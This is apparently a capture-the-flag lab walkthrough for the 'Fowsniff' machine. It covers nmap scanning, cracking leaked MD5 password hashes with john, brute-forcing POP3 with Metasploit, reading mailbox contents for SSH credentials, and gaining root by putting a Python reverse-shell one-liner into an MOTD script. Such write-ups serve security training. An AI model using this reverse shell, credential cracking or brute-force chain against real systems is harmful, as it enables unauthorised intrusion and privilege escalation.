---
custom_edit_url: null
---

## Task 1: Hack into the FowSniff organisation.
### Deploy the machine. On the top right of this you will see a **Deploy** button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.
### No answer needed

&nbsp;

### Using nmap, scan this machine. What ports are open?
Let's perform a scan using `nmap`.
```
$ nmap -sC -sV 10.10.251.22
Starting Nmap 7.92 ( https://nmap.org ) at 2023-12-17 08:35 IST
Nmap scan report for 10.10.251.22
Host is up (0.13s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 90:35:66:f4:c6:d2:95:12:1b:e8:cd:de:aa:4e:03:23 (RSA)
|   256 53:9d:23:67:34:cf:0a:d5:5a:9a:11:74:bd:fd:de:71 (ECDSA)
|_  256 a2:8f:db:ae:9e:3d:c9:e6:a9:ca:03:b1:d7:1b:66:83 (ED25519)
80/tcp  open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Fowsniff Corp - Delivering Solutions
|_http-server-header: Apache/2.4.18 (Ubuntu)
110/tcp open  pop3    Dovecot pop3d
|_pop3-capabilities: CAPA SASL(PLAIN) USER UIDL AUTH-RESP-CODE RESP-CODES PIPELINING TOP
143/tcp open  imap    Dovecot imapd
|_imap-capabilities: post-login OK AUTH=PLAINA0001 have Pre-login more listed capabilities IMAP4rev1 IDLE SASL-IR ENABLE ID LITERAL+ LOGIN-REFERRALS
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.44 seconds
```
There are four open ports:

| Port | Service |
| :-: | :-: |
| 22   | ssh     |
| 80   | http    |
| 110  | pop3    |
| 143  | imap    |

### No answer needed

&nbsp;

### Using the information from the open ports. Look around. What can you find?
We can visit the target using our browser.

![2](https://github.com/Knign/Write-ups/assets/110326359/41cd6256-ab6f-4190-af75-eaff51c69a6b)

### No answer needed

&nbsp;

### Using Google, can you find any public information about them?
On searching for a while, we can find this page which has a bunch of the employees' passwords.

![3](https://github.com/Knign/Write-ups/assets/110326359/8395f86f-79bc-4b8e-baaa-df2608066737)

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```
However these passwords are hashed.
### No answer needed

&nbsp;

### Can you decode these md5 hashes? You can even use sites like [hashkiller](https://hashkiller.io/listmanager) to decode them.
We can identify the hashes using `hash-identifier`.
```
$ hash-identifier 8a28a94a588a95b80163709ab4313aa4                                                  
--------------------------------------------------

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
Similar to the first one all the rest are hashed using MD5 algorithm.

Now let's save the hashes in a file and use `john` to crack them.
```
$ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes
$ john --format=Raw-MD5 --show hashes                                            
?:mailcall
?:bilbo101
?:apples01
?:skyler22
?:scoobydoo2
?:carp4ever
?:orlando12
?:07011972

8 password hashes cracked, 1 left
```

| Users    | 
| :-: |
| mauer    | 
| mustikka |
| tegel    | 
| baksteen | 
| seina    | 
| stone    |           
| mursten  | 
| parede   | 
| sciana   | 

| Passwords  |
| :-: |
| mailcall   |
| bilbo101   |
| apples01   |
| skyler22   |
| scoobydoo2 |
| carp4ever  |
| orlando12  |
| 07011972           |

For some reason `john` could not crack the hash of sixth password.
### No answer needed

&nbsp;

### Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
Let's create the database and run `msfconsole`.
```
$ sudo msfdb run
```
We can now search for modules related to Pop3.
```
msf6 > search pop3

Matching Modules
================

   #  Name                                          Disclosure Date  Rank     Check  Description
   -  ----                                          ---------------  ----     -----  -----------
   0  auxiliary/server/capture/pop3                                  normal   No     Authentication Capture: POP3
   1  exploit/linux/pop3/cyrus_pop3d_popsubfolders  2006-05-21       normal   No     Cyrus IMAPD pop3d popsubfolders USER Buffer Overflow
   2  auxiliary/scanner/pop3/pop3_version                            normal   No     POP3 Banner Grabber
   3  auxiliary/scanner/pop3/pop3_login                              normal   No     POP3 Login Utility
   4  exploit/windows/pop3/seattlelab_pass          2003-05-07       great    No     Seattle Lab Mail 5.5 POP3 Buffer Overflow
   5  post/windows/gather/credentials/outlook                        normal   No     Windows Gather Microsoft Outlook Saved Password Extraction
   6  exploit/windows/smtp/ypops_overflow1          2004-09-27       average  Yes    YPOPS 0.6 Buffer Overflow
```
We will be using the fourth module. Let's select it using the following command:
```
msf6 > use 3
msf6 auxiliary(scanner/pop3/pop3_login) > 
```
Let's set up the module.
```
msf6 auxiliary(scanner/pop3/pop3_login) > set rhosts 10.10.251.22
rhosts => 10.10.251.22
msf6 auxiliary(scanner/pop3/pop3_login) > set user_file usernames.txt
user_file => usernames.txt
msf6 auxiliary(scanner/pop3/pop3_login) > set pass_file passwords.txt
pass_file => passwords.txt
msf6 auxiliary(scanner/pop3/pop3_login) > set verbose false
verbose => false
```
We are now all set to brute force the login.
```
msf6 auxiliary(scanner/pop3/pop3_login) > run

[+] 10.10.251.22:110            - 10.10.251.22:110 - Success: seina:scooby2
```
### No answer needed

&nbsp;

### What was seina's password to the email service?
### Answer
```
scoobydoo2
```

&nbsp;

### Can you connect to the pop3 service with her credentials? What email information can you gather?
We can connect to the Pop3 service using `nc`.
```
$ nc 10.10.251.22 110    
+OK Welcome to the Fowsniff Corporate Mail Server!
user seina
+OK
pass scoobydoo2
+OK Logged in.
```
### No answer needed

&nbsp;

### Looking through her emails, what was a temporary password set for her?
We can use the `list` command to list out the contents.
```
list
+OK 2 messages:
1 1622
2 1280
.
```
There are two messages. Let's read the first message using `retr`.
```
retr 1
+OK 1622 octets
Return-Path: <stone@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1000)
        id 0FA3916A; Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
To: baksteen@fowsniff, mauer@fowsniff, mursten@fowsniff,
    mustikka@fowsniff, parede@fowsniff, sciana@fowsniff, seina@fowsniff,
    tegel@fowsniff
Subject: URGENT! Security EVENT!
Message-Id: <20180313185107.0FA3916A@fowsniff>
Date: Tue, 13 Mar 2018 14:51:07 -0400 (EDT)
From: stone@fowsniff (stone)

Dear All,

A few days ago, a malicious actor was able to gain entry to
our internal email systems. The attacker was able to exploit
incorrectly filtered escape characters within our SQL database
to access our login credentials. Both the SQL and authentication
system used legacy methods that had not been updated in some time.

We have been instructed to perform a complete internal system
overhaul. While the main systems are "in the shop," we have
moved to this isolated, temporary server that has minimal
functionality.

This server is capable of sending and receiving emails, but only
locally. That means you can only send emails to other users, not
to the world wide web. You can, however, access this system via 
the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"

You MUST change this password as soon as possible, and you will do so under my
guidance. I saw the leak the attacker posted online, and I must say that your
passwords were not very secure.

Come see me in my office at your earliest convenience and we'll set it up.

Thanks,
A.J Stone


.
```
### Answer
```
S1ck3nBluff+secureshell
```

&nbsp;

### In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
Let's read the second message.
```
ret 2
-ERR Unknown command: RET
retr 2
+OK 1280 octets
Return-Path: <baksteen@fowsniff>
X-Original-To: seina@fowsniff
Delivered-To: seina@fowsniff
Received: by fowsniff (Postfix, from userid 1004)
        id 101CA1AC2; Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
To: seina@fowsniff
Subject: You missed out!
Message-Id: <20180313185405.101CA1AC2@fowsniff>
Date: Tue, 13 Mar 2018 14:54:05 -0400 (EDT)
From: baksteen@fowsniff

Devin,

You should have seen the brass lay into AJ today!
We are going to be talking about this one for a looooong time hahaha.
Who knew the regional manager had been in the navy? She was swearing like a sailor!

I don't know what kind of pneumonia or something you brought back with
you from your camping trip, but I think I'm coming down with it myself.
How long have you been gone - a week?
Next time you're going to get sick and miss the managerial blowout of the century,
at least keep it to yourself!

I'm going to head home early and eat some chicken soup. 
I think I just got an email from Stone, too, but it's probably just some
"Let me explain the tone of my meeting with management" face-saving mail.
I'll read it when I get back.

Feel better,

Skyler

PS: Make sure you change your email password. 
AJ had been telling us to do that right before Captain Profanity showed up.

.
```
The email was sent by `baksteen` which we can see in the `From:` field.

Let's connect using SSH.
```
$ ssh baksteen@10.10.251.22
baksteen@10.10.251.22's password: 

                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions


   ****  Welcome to the Fowsniff Corporate Server! **** 

              ---------- NOTICE: ----------

 * Due to the recent security breach, we are running on a very minimal system.
 * Contact AJ Stone -IMMEDIATELY- about changing your email and SSH passwords.


Last login: Tue Mar 13 16:55:40 2018 from 192.168.7.36
baksteen@fowsniff:~$ 
```
### No answer needed

&nbsp;

### Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
We can check which group the `baksteen` user belongs to using the following command:
```
baksteen@fowsniff:~$ id
uid=1004(baksteen) gid=100(users) groups=100(users),1001(baksteen)
```
As we can see `baksteen` belongs to the `users` group.

Now, let's find the files that can be run by the `users` group.
```
baksteen@fowsniff:~$ find / -group users -type f 2>/dev/null
/opt/cube/cube.sh
```
### No answer needed

&nbsp;

### Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?
Let's check what the file does.
```
printf "
                            _____                       _  __  __  
      :sdddddddddddddddy+  |  ___|____      _____ _ __ (_)/ _|/ _|  
   :yNMMMMMMMMMMMMMNmhsso  | |_ / _ \ \ /\ / / __| '_ \| | |_| |_   
.sdmmmmmNmmmmmmmNdyssssso  |  _| (_) \ V  V /\__ \ | | | |  _|  _|  
-:      y.      dssssssso  |_|  \___/ \_/\_/ |___/_| |_|_|_| |_|   
-:      y.      dssssssso                ____                      
-:      y.      dssssssso               / ___|___  _ __ _ __        
-:      y.      dssssssso              | |   / _ \| '__| '_ \     
-:      o.      dssssssso              | |__| (_) | |  | |_) |  _  
-:      o.      yssssssso               \____\___/|_|  | .__/  (_) 
-:    .+mdddddddmyyyyyhy:                              |_|        
-: -odMMMMMMMMMMmhhdy/.    
.ohdddddddddddddho:                  Delivering Solutions\n\n"
```
We can include the reverse shell that was provided to us with a few modifications:
```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.17.48.138",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
### No answer needed

&nbsp;

### If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in **/etc/update-motd.d/** file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!
Let's start a `nc` listener on port 9999.
```
$ nc -nlvp 9999
listening on [any] 9999 ...
```
Let's login again using SSH.
```
ssh baksteen@10.10.251.22
```
If we check back on our listener, we will find that we have a reverse shell as `root`.
```
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.17.48.138] from (UNKNOWN) [10.10.251.22] 58062
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```
### No answer needed

&nbsp;

### If you are **really really** stuck, there is a brilliant walkthrough here: [https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/) **[](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/)**
### No answer needed
